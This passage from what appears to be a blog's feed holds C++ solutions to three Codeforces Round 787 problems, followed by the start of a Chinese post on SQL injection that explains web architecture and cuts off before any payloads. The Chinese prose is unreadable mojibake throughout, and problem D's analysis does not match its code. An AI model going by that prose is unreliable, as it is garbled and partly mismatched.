class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Detective-Task"><a href="#C-Detective-Task" class="headerlink" title="C. Detective Task"></a>C. Detective Task</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯é€»è¾‘æ¨ç†é¢˜ï¼Œæ­£é¢æ€è€ƒæ— æœä¹‹åå‘ç°ä¸€ç‚¹ï¼šå½“ä¸€ä¸ªäººæ˜¯å°å·çš„æ—¶å€™ï¼Œè¿™ä¸ªäººå‰é¢å…¨ä¸º1æˆ–è€…?ï¼Œåé¢å…¨ä¸º0æˆ–è€…?å½“éå†ç¬¬ i ä¸ªäººçš„æ—¶å€™ï¼Œ<code>cnt(?|1)=i-1 cnt(?|0)=n-i</code></p><p>å¦‚æœè¦åˆ¤æ–­è¿™ä¸ªäººæ˜¯ä¸æ˜¯å°å·ï¼Œåªéœ€è¦çœ‹å…¶ä»–äººè¯´çš„å…¨ä¸ºçœŸè¯æ—¶ï¼Œ èƒ½å¦è¯æ˜å®ƒæ˜¯å°å·ï¼Œå› æ­¤æˆ‘å°±ä¸ç”¨ç®¡å®ƒè¯´äº†ä»€ä¹ˆï¼Œç›´æ¥æ»šåŠ¨è¿‡å»åˆ¤æ–­å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> cnt1=<span class="number">0</span>,cnt0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)cnt0++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            cnt0--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>||s[i<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            cnt1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt0==len-i&amp;&amp;cnt1==i<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ ‘é“¾å‰–åˆ†æ¿é¢˜ï¼Œè€Œä¸”åªè¦è½»é‡é“¾å‰–åˆ†å®Œäº†å°±å¯ä»¥ç›´æ¥è¾“å‡ºäº†ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Replace-With-the-Previous-Minimize"><a href="#E-Replace-With-the-Previous-Minimize" class="headerlink" title="E. Replace With the Previous, Minimize"></a>E. Replace With the Previous, Minimize</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/5.png" alt="5"></p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜æœ‰ç‚¹å°æ„æ€ï¼Œæ„æ€å°±æ˜¯ä¸€æ¬¡æ“ä½œèƒ½æŠŠä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‰€æœ‰ç‰¹å®šå­—ç¬¦å˜å° <code>1</code>ï¼Œé—®ä½  <code>k</code> æ¬¡æ“ä½œç”Ÿæˆçš„å­—å…¸åºæœ€å°çš„å­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆã€‚é¦–å…ˆæœ‰ä¸€ç‚¹è‚¯å®šæ²¡é”™ï¼Œå°±æ˜¯æˆ‘æ— è„‘æŠŠå‰é¢ä¸æ˜¯ <code>a</code> çš„å­—ç¬¦å…ˆéƒ½å˜ <code>a</code> äº†è‚¯å®šä¸ä¼šæœ‰é—®é¢˜ã€‚ä½†æ˜¯æœ‰ä¸€ç‚¹éœ€è¦è€ƒè™‘ï¼Œé‚£å°±æ˜¯å…ˆå˜å‰é¢ï¼Œå¦‚æœåé¢è¿˜æœ‰æ¯”è¿™ä¸ªå¤§ä¸€ç‚¹çš„ï¼Œé‚£å°±åˆéœ€è¦å¾ˆå¤šæ¬¡æ‰èƒ½å˜æˆ <code>a</code> äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ”¶é›†æ‰€æœ‰èƒ½åœ¨ <code>k</code> æ¬¡èŒƒå›´å†…å˜æˆ <code>a</code> çš„å­—ç¬¦ï¼Œä»å·¦åˆ°å³éå†ï¼Œæ˜¾è€Œæ˜“è§ï¼Œk&gt;=25åˆ™ä¸€å®šå¯ä»¥è¾¾åˆ°å…¨ <code>a</code> çš„çŠ¶æ€ã€‚é‡åˆ°äº†ä¸èƒ½åœ¨ <code>k</code> æ¬¡å˜æˆ <code>a</code> çš„å­—ç¬¦ä¹‹åï¼ŒæŠŠå‰é¢å–å¾—çš„æœ€å¤§æ¬¡æ•°å…ˆç”¨æ‰ï¼Œå¦‚æœæ¬¡æ•°æœ‰å‰©ä½™ï¼Œæ— è„‘ç»™é‚£ä¸€ä¸ªå­—ç¬¦å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-4"><a href="#æ ‡ç¨‹-4" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">//putchar(ch);putchar(10);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==ch)s[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;,s);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">25</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]-<span class="string">&#x27;a&#x27;</span>&gt;k)&#123;</span><br><span class="line">            <span class="keyword">int</span> th=k-q;</span><br><span class="line">            <span class="keyword">char</span> cc=s[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;th;j++)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d &quot;,j);</span></span><br><span class="line">                <span class="comment">//putchar(cc-j);</span></span><br><span class="line">                <span class="built_in">change</span>(cc-j);</span><br><span class="line">                <span class="comment">//putchar(s[i]-j);putchar(10);</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=q;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="built_in">change</span>(<span class="string">&#x27;a&#x27;</span>+j);</span><br><span class="line">            &#125;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        q=<span class="built_in">max</span>(q,s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,q);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ rating è¿˜æ²¡å‡ºæ¥ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½è“ï¼Œä¸è¿‡æˆ‘çŸ¥é“å¦‚æœ A ä¸å¤±è¯¯æ˜¯ä¸€å®šæœ‰æœºä¼šè“åçš„ï¼Œä¸‹æ¬¡å†æ¥å†å‰å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥æ€»ç»“</title>
      <link href="/2022/05/04/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/04/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sqlå­¦äº†ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæƒ³ç€æŠŠèƒ½ç”¨åˆ°çš„çŸ¥è¯†ç‚¹éƒ½å†™ä¸€éå¥½ã€‚</p><span id="more"></span><p>å…ˆçjbæ‰¯å‡ å¥</p><h2 id="WEBæ¡†æ¶"><a href="#WEBæ¡†æ¶" class="headerlink" title="WEBæ¡†æ¶"></a>WEBæ¡†æ¶</h2><p><code>web</code>åº”ç”¨ä¸€æ”¹æˆ‘ä»¬å¹³æ—¶å¸¸è§çš„ <code>p2p</code> å’Œ <code>C/S</code> æ¨¡å¼ï¼Œé‡‡ç”¨ <code>B/S</code> æ¨¡å¼ã€‚éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼Œç‰¹åˆ«éšç€WebæŠ€æœ¯çš„ä¸æ–­æˆç†Ÿï¼ŒB/S è¿™ç§è½¯ä»¶ä½“ç³»ç»“æ„å‡ºç°äº†ã€‚<strong>æµè§ˆå™¨-æœåŠ¡å™¨ï¼ˆBrowser/Serverï¼‰ç»“æ„</strong>ï¼Œç®€ç§° <code>B/S</code> ç»“æ„ï¼Œä¸ <code>C/S</code>ä¸åŒï¼Œå…¶å®¢æˆ·ç«¯ä¸éœ€è¦å®‰è£…ä¸“é—¨çš„è½¯ä»¶ï¼Œåªéœ€è¦æµè§ˆå™¨å³å¯ï¼Œæµè§ˆå™¨ä¸WebæœåŠ¡å™¨äº¤äº’ï¼ŒWebæœåŠ¡å™¨ä¸åç«¯æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åœ¨ä¸åŒå¹³å°ä¸‹å·¥ä½œã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬ç©çš„è‹±é›„è”ç›Ÿå°±æ˜¯å…¸å‹çš„ <code>C/S</code> ç»“æ„çš„æœåŠ¡ï¼Œå› ä¸ºæœ‰å¤§é‡å›¾ç‰‡èµ„æºå’Œ <code>3D</code> æ¨¡å‹å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå› æ­¤æå‰å®‰è£…å¥½å®¢æˆ·ç«¯å°±å¯ä»¥æ–¹ä¾¿åœ°ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå¦‚æœé‡‡ç”¨ <code>B/S</code> ç»“æ„çš„è¯ï¼Œåœ¨æˆ‘ä»¬æ¸¸æˆå¼€å§‹çš„æ—¶å€™å°±è¦ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œä¸‹è½½å¥½å„ç§èµ„æºåˆ°æœ¬åœ°ï¼Œç„¶åå†ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå„ç§é¡µæ¸¸å‡æ˜¯ <code>B/S</code> ç»“æ„ã€‚<code>B/S</code> çš„ä¼˜åŠ¿å°±æ˜¯å¯¹éœ€è¦æœåŠ¡ä¸€æ–¹çš„ç”µè„‘è¦æ±‚è¾ƒä½ï¼Œå¾ˆå®¹æ˜“å¯ä»¥å…¼å®¹ç³»ç»Ÿä¸Šçš„å·®å¼‚ï¼Œå®¢æˆ·å¾€å¾€åªéœ€è¦å®‰è£…æµè§ˆå™¨ä¾¿å¯ä»¥äº«å—å…¨éƒ¨çš„  <code>web</code> æœåŠ¡ã€‚<code>web</code> åº”ç”¨ä¼šå…ˆå‘æˆ‘ä»¬çš„æµè§ˆå™¨å‘é€å‰ç«¯è¯­è¨€ <code>javascript</code> æˆ–è€… <code>html</code> ç»™æµè§ˆå™¨è§£ææ‰§è¡Œï¼Œæˆ‘ä»¬ç»è¿‡ä¸€å®šçš„æ“ä½œä¹‹åä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®æˆ‘ä»¬çš„è¯·æ±‚åšå‡ºä¸åŒçš„ç­”å¤ï¼Œè¿™ä¸ªç­”å¤è¿˜æ˜¯å‰ç«¯è¯­è¨€å½¢æˆçš„ç½‘é¡µã€‚</p><p>æœåŠ¡å™¨ä¼šæ ¹æ®ä»€ä¹ˆè§„åˆ™å»å“åº”è¯·æ±‚ï¼Œè¿™ä¸ªå°±è¦ç”¨åˆ°åç«¯è¯­è¨€äº†ï¼Œå¦‚ <code>php</code>,<code>aspx</code> ç­‰éƒ½æ˜¯å¸¸è§çš„åç«¯è¯­è¨€ï¼Œç°åœ¨ä»¥ <code>php</code> ä¸ºä¸»ã€‚æ¯”å¦‚æˆ‘ä»¬å®ç°ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•è‚¯å®šæ˜¯ä¼šç”¨åˆ°æ•°æ®åº“æŸ¥è¯¢æ“ä½œçš„ï¼Œæˆ‘ä»¬å°†è¯·æ±‚æäº¤ç»™æœåŠ¡å™¨ä¹‹åï¼Œåç«¯è¯­è¨€å¾—åˆ°æˆ‘ä»¬å‘é€çš„æ•°æ®ï¼Œç„¶ååç«¯è¯­è¨€å°±ä¼šç›¸åº”åœ°æ„é€  <code>sql</code> è¯­å¥å»æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œå¹¶æ ¹æ®æŸ¥è¯¢ç»“æœæ¥å“åº”æˆ‘ä»¬</p><p>é‚£ä¹ˆæˆ‘ä»¬å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬è´Ÿè´£å‘é€æ•°æ®ï¼Œ<code>php</code> æ„é€  <code>sql</code> è¯­å¥å»æŸ¥è¯¢ã€‚é¦–å…ˆæ˜ç™½ä¸€ç‚¹ï¼Œ<code>sql</code> è¯­å¥è‚¯å®šæˆ‘ä»¬èƒ½æ§åˆ¶ï¼Œå› ä¸ºæˆ‘è¾“å…¥ä»€ä¹ˆå®ƒå°±è¦å»æŸ¥ä»€ä¹ˆã€‚æˆ‘ä»¬çš„è¾“å…¥ä¸€å®šä¼šè¢«åµŒå…¥ <code>sql</code> è¯­å¥ã€‚å¦‚æœæˆ‘ä»¬åœ¨ <code>sql</code> ä¸­èƒ½è¾“å…¥ä»»æ„å†…å®¹ï¼Œé‚£æˆ‘å°±ç›¸å½“äºç›´æ¥æ§åˆ¶äº†æ•´ä¸ªæ•°æ®åº“ã€‚<code>sql</code> æ³¨å…¥çš„å°±è¿™ä¹ˆäº§ç”Ÿäº†ï¼Œå¸¦æ¥çš„æœ¬è´¨å±å®³ä¹Ÿå°±æ˜¯æ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼Œå¦‚æœæ•°æ®åº“é…ç½®æƒé™è¿‡é«˜ç”šè‡³èƒ½è®©æ”»å‡»è€…æ‹¿åˆ° <code>shell</code>ã€‚</p><h2 id="sqlè¯­è¨€"><a href="#sqlè¯­è¨€" class="headerlink" title="sqlè¯­è¨€"></a>sqlè¯­è¨€</h2><p><code>SQL</code>(<code>Structured Query 